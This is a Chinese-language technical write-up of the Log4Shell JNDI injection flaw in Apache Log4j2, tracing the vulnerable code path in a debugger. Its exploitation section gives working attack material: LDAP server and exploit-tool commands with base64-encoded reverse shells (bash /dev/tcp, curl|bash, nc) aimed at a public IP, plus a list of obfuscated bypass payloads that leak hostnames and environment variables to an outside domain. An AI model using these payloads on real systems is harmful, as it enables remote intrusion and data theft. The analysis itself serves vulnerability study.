# 漏洞简介

**Apache Log4j2**是一个基于Java的日志记录工具。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。

漏洞适用版本为2.0 <= Apache log4j2 <= 2.14.1，只需检测Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响

# 环境搭建

直接创建Maven项目导入log4j2的依赖

```
<dependencies>
    <dependency>
        <groupId>org.apache.logging.log4j</groupId>
        <artifactId>log4j-core</artifactId>
        <version>2.14.0</version>
    </dependency>
</dependencies>
```

# 漏洞原理

 Log4j2 中的日志等级分别为: ALL < DEBUG < INFO < WARN < ERROR < FATAL < OFF

只要使用了org/apache/logging/log4j/spi/AbstractLogger.java log进行记录，且log等级为可记录等级即可触发次漏洞

一旦在log字符串中检测到${}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用

大致的漏洞代码

```
private static final Logger logger = LogManager.getLogger();
public static void main(String[] args) {
  logger.error("${jndi:ldap://ip:1389/#Exploit}");
}
```

# 漏洞分析

漏洞入口点:AbstractLogger.class的`logIfEnabled`方法

![image-20220222200220983](images/1.png)

如果使用了AbstractLogger.java中的debug、info、warn、error、fatal等都会触发到该函数

![image-20220222202323192](images/2.png)

那就跟进`logIfEnabled`方法,层层跟进来到了AbstractLogger.tryLogMessage.log方法

```
private void tryLogMessage(final String fqcn, final StackTraceElement location, final Level level, final Marker marker, final Message msg, final Throwable throwable) {
    try {
        this.log(level, marker, fqcn, location, msg, throwable);
    } catch (Exception var8) {
        this.handleLogMessageException(var8, fqcn, msg);
    }

}
```

这里需要打着断点动态调试,不然会进到`AbstractLogger.log`方法,但是实际上执行的时候是`org.apache.logging.log4j.core.Loggger.log`方法

![image-20220222203306997](images/3.png)

继续跟进log方法,来到了org/apache/logging/log4j/core/config/DefaultReliabilityStrategy.log

```
public void log(final Supplier<LoggerConfig> reconfigured, final String loggerName, final String fqcn, final StackTraceElement location, final Marker marker, final Level level, final Message data, final Throwable t) {
    this.loggerConfig.log(loggerName, fqcn, location, marker, level, data, t);
}
```

跟进log

```
public void log(final String loggerName, final String fqcn, final StackTraceElement location, final Marker marker, final Level level, final Message data, final Throwable t) {
    List<Property> props = null;
    if (!this.propertiesRequireLookup) {
        props = this.properties;
    } else if (this.properties != null) {
        props = new ArrayList(this.properties.size());
        LogEvent event = Log4jLogEvent.newBuilder().setMessage(data).setMarker(marker).setLevel(level).setLoggerName(loggerName).setLoggerFqcn(fqcn).setThrown(t).build();

        for(int i = 0; i < this.properties.size(); ++i) {
            Property prop = (Property)this.properties.get(i);
            String value = prop.isValueNeedsLookup() ? this.config.getStrSubstitutor().replace(event, prop.getValue()) : prop.getValue();
            ((List)props).add(Property.createProperty(prop.getName(), value));
        }
    }

    LogEvent logEvent = this.logEventFactory instanceof LocationAwareLogEventFactory ? ((LocationAwareLogEventFactory)this.logEventFactory).createEvent(loggerName, marker, fqcn, location, level, data, (List)props, t) : this.logEventFactory.createEvent(loggerName, marker, fqcn, level, data, (List)props, t);

    try {
        this.log(logEvent, LoggerConfig.LoggerConfigPredicate.ALL);
    } finally {
        ReusableLogEventFactory.release(logEvent);
    }

}
```

前面一大串都是无关紧要的代码,跟进try里面的log

```
protected void log(final LogEvent event, final LoggerConfig.LoggerConfigPredicate predicate) {
    if (!this.isFiltered(event)) {
        this.processLogEvent(event, predicate);
    }

}
```

跟进processLogEvent

```
private void processLogEvent(final LogEvent event, final LoggerConfig.LoggerConfigPredicate predicate) {
    event.setIncludeLocation(this.isIncludeLocation());
    if (predicate.allow(this)) {
        this.callAppenders(event);
    }

    this.logParent(event, predicate);
}
```

跟进callAppenders

```
protected void callAppenders(final LogEvent event) {
    AppenderControl[] controls = this.appenders.get();

    for(int i = 0; i < controls.length; ++i) {
        controls[i].callAppender(event);
    }

}
```

跟进callAppender,来到了AppenderControl.class的callAppender方法

```
public void callAppender(final LogEvent event) {
    if (!this.shouldSkip(event)) {
        this.callAppenderPreventRecursion(event);
    }
}
```

一路跟进最后来到了AppenderControl.tryCallAppender

```
private void tryCallAppender(final LogEvent event) {
    try {
        this.appender.append(event);
    } catch (RuntimeException var3) {
        this.handleAppenderError(event, var3);
    } catch (Throwable var4) {
        this.handleAppenderError(event, new AppenderLoggingException(var4));
    }

}
```

跟进append

```
public void append(final LogEvent event) {
    try {
        this.tryAppend(event);
    } catch (AppenderLoggingException var3) {
        this.error("Unable to write to stream " + this.manager.getName() + " for appender " + this.getName(), event, var3);
        throw var3;
    }
}
```

跟进tryAppend

```
private void tryAppend(final LogEvent event) {
    if (Constants.ENABLE_DIRECT_ENCODERS) {
        this.directEncodeEvent(event);
    } else {
        this.writeByteArrayToManager(event);
    }

}
```

跟进`directEncodeEvent`方法

```
protected void directEncodeEvent(final LogEvent event) {
    this.getLayout().encode(event, this.manager);
    if (this.immediateFlush || event.isEndOfBatch()) {
        this.manager.flush();
    }

}
```

跟进encode方法

```
public void encode(final LogEvent event, final ByteBufferDestination destination) {
    if (!(this.eventSerializer instanceof Serializer2)) {
        super.encode(event, destination);
    } else {
        StringBuilder text = this.toText((Serializer2)this.eventSerializer, event, getStringBuilder());
        Encoder<StringBuilder> encoder = this.getStringBuilderEncoder();
        encoder.encode(text, destination);
        trimToMaxSize(text);
    }
}
```

跟进toText

```
private StringBuilder toText(final Serializer2 serializer, final LogEvent event, final StringBuilder destination) {
    return serializer.toSerializable(event, destination);
}
```

跟进toSerializable

![image-20220222205350305](images/4.png)

这里的formatters包含了11个PatternFormatter对象

![image-20220222210024941](images/5.png)

在编号8也即是MessagePatternConverter对象

通过PatternFormatter.class的format方法

```
public void format(final LogEvent event, final StringBuilder buf) {
    if (this.skipFormattingInfo) {
        this.converter.format(event, buf);
    } else {
        this.formatWithInfo(event, buf);
    }

}
```

来到了MessagePatternConverter的format方法,也是核心的部分

![image-20220222211419257](images/6.png)

关键代码

```
if (this.config != null && !this.noLookups) {
    for(int i = offset; i < workingBuilder.length() - 1; ++i) {
    	//if判断是否以${开头
        if (workingBuilder.charAt(i) == '$' && workingBuilder.charAt(i + 1) == '{') {
        	//这里截取value,结果是${jndi:ldap://127.0.0.1:1389/#Exploit}
            String value = workingBuilder.substring(offset, workingBuilder.length());
            workingBuilder.setLength(offset);
            workingBuilder.append(this.config.getStrSubstitutor().replace(event, value));
        }
    }
}
```

随后跟进replace方法

```
public String replace(final LogEvent event, final String source) {
    if (source == null) {
        return null;
    } else {
        StringBuilder buf = new StringBuilder(source);
        return !this.substitute(event, buf, 0, source.length()) ? source : buf.toString();
    }
}
```

跟进substitute,跟进两次substitute函数最后来到

![image-20220222211806571](images/7.png)

简单来说，pos为当前字符串头指针，prefixMatcher.isMatch只负责匹配 `${` 两个字符。![image-20220222213021167](images/8.png)

后续的处理中, 通过多个 if-else 来匹配 `:-` 和 `:\-` . 

```
:- 是一个赋值关键字, 如果程序处理到 ${aaaa:-bbbb} 这样的字符串, 处理的结果将会

是 bbbb , :- 关键字将会被截取掉, 而之前的字符串都会被舍弃掉.

:\- 是转义的 :- , 如果一个用 a:b 表示的键值对的 key a 中包含 : , 则需要使用转义来

配合处理, 例如 ${aaa:\\-bbb:-ccc} , 代表 key 是 aaa:bbb , value 是 ccc
```

这里的匹配函数

![image-20220222213559678](images/9.png)

这里匹配到后会进入第二层循环去匹配`}`,和第一层相类似,绕过没有匹配到`}`,pos指针+1

![image-20220222213427428](images/10.png)

匹配函数

![image-20220222213622529](images/11.png)

满足上面两个过程后,来到了第三阶段

![image-20220222213934286](images/12.png)

提取`${}`中的内容赋值给`varNameExpr`变量,也即是![image-20220222214049122](images/13.png)

最后一路执行来到了418行

![image-20220222214338086](images/14.png)

跟进resolverVariable方法

```
protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf, final int startPos, final int endPos) {
    StrLookup resolver = this.getVariableResolver();
    return resolver == null ? null : resolver.lookup(event, variableName);
}
```

跟进lookup,来到了Interpolator的lookup方法

Interpolator实际上是一个代理类. Log4j2使用 org.apache.logging.log4j.core.lookup.Interpolator 类来代理所有的 StrLookup 实现类. 也就是说在实际使用 Lookup 功能时, 是由 Interpolator 这个类来处理和分发的

这个类在初始化时创建了一个 strLookupMap , 将一些 lookup 功能关键字和处理类进行了映射, 存放在这个 Map 中

![image-20220222221128539](images/15.png)

在 2.14.0 版本中, 默认是加入 `log4j 、sys 、env 、main 、marker 、java 、lower 、upper 、jndi 、jvmrunargs 、spring 、kubernetes 、docker 、web 、date 、ctx` , 由于部分功能的支持并不在 core 包中, 所以如果加载不到对应的处理类, 则会添加警告信息并跳过. 而这些不同 Lookup 功能的支持, 是随着版本更新的, 例如在较低版本中不存在 upper 、lower 这两种功能

![image-20220222221012673](images/16.png)

调试发现interpolator类的lookup函数会以`:`为分隔符进行分割以获取prefixpos内容，传入的prefixpos内容为jndi字符串因此this.strLookupMap获取到的类为JndiLookup类

![image-20220222221327953](images/17.png)

跟进lookup方法

![image-20220222221859004](images/18.png)

这里跟进到jndiManager的lookup方法

![image-20220222221918531](images/19.png)

![image-20220222222036436](images/20.png)

这里就可以去执行InitialContext.java 原生lookup解析函数,也就是jndi注入漏洞的起点

# 漏洞利用

起一个ldap服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8088/#test
```

编写恶意类test.java

```
public class test {
    public test() throws Exception{
        Runtime.getRuntime().exec("calc");
    }
}
```

开启web服务

```
python -m http.server 8088
```

exp

```
package Log4j2;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class exp {
    private static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/#Exploit}");
    }
}
```

![image-20220221183255576](images/21.png)

除了用marshalsec工具起ldap服务,还可以直接利用jndi注入工具,这种方法更为实用,不用再去编译恶意class文件和起ldap服务,本地测试的时候也不用去起HTTP服务端

平常我反弹shell的时候就是用的这个工具

```
bash反弹shell

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45My4yNDguMjIxLzIzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}" -A "47.93.248.221"
```

base64编码内容为要执行的命令,这个工具需要用jdk11去起

```
curl反弹shell

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,Y3VybCA0Ny45My4yNDguMjIxfGJhc2g=}|{base64,-d}|{bash,-i}" -A "47.93.248.221"
```

```
nc反弹shell

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,bmMgNDcuOTMuMjQ4LjIyMSAyMzMzIC1lIC9iaW4vc2g=}|{base64,-d}|{bash,-i}" -A "47.93.248.221"
```

# RC1修复绕过

在修复后,`PatternLayout.toSerializable`方法发生了变化，主要还是因为其中的`formatters`属性的变化导致了`${}`不会被处理

不过存在绕过,只要在payload中加一个空格即可

```
${jndi:ldap://127.0.0.1:1389/ ExportObject}
```

不过这个方法需要在开启lookup配置的时候才能被绕过

# 一些绕过的payload

```
${jndi:ldap://127.0.0.1:1389/ badClassName} ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::- i}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 

${${::-j}ndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 

${jndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk} 

${${lower:jndi}:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 

${${lower:${lower:jndi}}:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit} 

${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sp loit} 

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://nsvi5sh112ksf1bp1ff2h vztn.l4j.zsec.uk/sploit} 

${${upper:jndi}:${upper:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}

${${upper:j}${upper:n}${lower:d}i:${upper:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sp loit} 

${${upper:j}${upper:n}${upper:d}${upper:i}:${lower:r}m${lower:i}}://nsvi5sh112ksf1bp1ff2h vztn.l4j.zsec.uk/sploit} 

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::- p}://${hostName}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk} 

${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::- a}${upper::-p}://${hostName}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk} 

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::- p}://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.nsvi5sh112ksf1bp1ff2hvztn.l 4j.zsec.uk
```





参考链接

https://xz.aliyun.com/t/10649#toc-2

https://www.anquanke.com/post/id/262668#h3-5

https://tttang.com/archive/1378/

https://www.cnpanda.net/sec/1114.html